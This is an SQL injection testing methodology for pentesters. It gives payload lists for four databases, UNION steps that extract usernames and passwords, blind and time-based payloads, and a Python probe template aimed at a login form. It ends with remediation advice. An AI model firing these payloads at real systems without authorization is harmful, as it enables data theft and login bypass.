# SQL Injection Testing Methodology

## Overview
SQL Injection allows attackers to interfere with database queries, potentially accessing, modifying, or deleting data.

## Types
- **In-band SQLi**: Error-based, UNION-based
- **Blind SQLi**: Boolean-based, Time-based
- **Out-of-band SQLi**: DNS/HTTP exfiltration

## Methodology

### 1. Identify Injection Points
- URL parameters
- POST data
- Cookies
- HTTP headers
- JSON/XML values

### 2. Initial Detection
```sql
'
"
`
')
")
`)
' OR '1'='1
" OR "1"="1
1 OR 1=1
1' OR '1'='1'--
```

### 3. Confirm Behavior
- Error messages
- Response differences
- Time delays

## Payloads by Database

### MySQL
```sql
' OR 1=1-- -
' UNION SELECT NULL,NULL,NULL-- -
' AND SLEEP(5)-- -
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
```

### PostgreSQL
```sql
' OR 1=1--
'; SELECT pg_sleep(5)--
' UNION SELECT NULL,NULL,NULL--
```

### MSSQL
```sql
' OR 1=1--
'; WAITFOR DELAY '0:0:5'--
' UNION SELECT NULL,NULL,NULL--
```

### Oracle
```sql
' OR 1=1--
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--
```

## UNION Attack Steps

1. **Determine column count**:
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
```

2. **Find string columns**:
```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
```

3. **Extract data**:
```sql
' UNION SELECT username,password,NULL FROM users-- -
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
```

## Blind SQLi Detection

### Boolean-based
```sql
' AND 1=1-- -  (true - normal response)
' AND 1=2-- -  (false - different response)
' AND SUBSTRING(username,1,1)='a'-- -
```

### Time-based
```sql
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

## PoC Template
```python
import requests
import time

def test_sqli(url, param, payload):
    """Test for SQL injection."""
    data = {param: payload}
    
    # Test for errors
    response = requests.post(url, data=data)
    error_indicators = [
        "sql syntax", "mysql", "postgresql", "oracle",
        "sqlite", "odbc", "syntax error", "unclosed quotation"
    ]
    
    for indicator in error_indicators:
        if indicator.lower() in response.text.lower():
            return {"vulnerable": True, "type": "error-based", "evidence": indicator}
    
    # Test for time-based
    start = time.time()
    data[param] = f"{payload}' AND SLEEP(5)-- -"
    requests.post(url, data=data)
    elapsed = time.time() - start
    
    if elapsed >= 5:
        return {"vulnerable": True, "type": "time-based", "delay": elapsed}
    
    return {"vulnerable": False}

# Usage
result = test_sqli("http://target.com/login", "username", "'")
print(result)
```

## Impact
- Authentication bypass
- Data extraction
- Data modification
- Remote code execution (in some cases)
- Privilege escalation

## Remediation
- Parameterized queries (prepared statements)
- Input validation
- Least privilege database accounts
- WAF rules
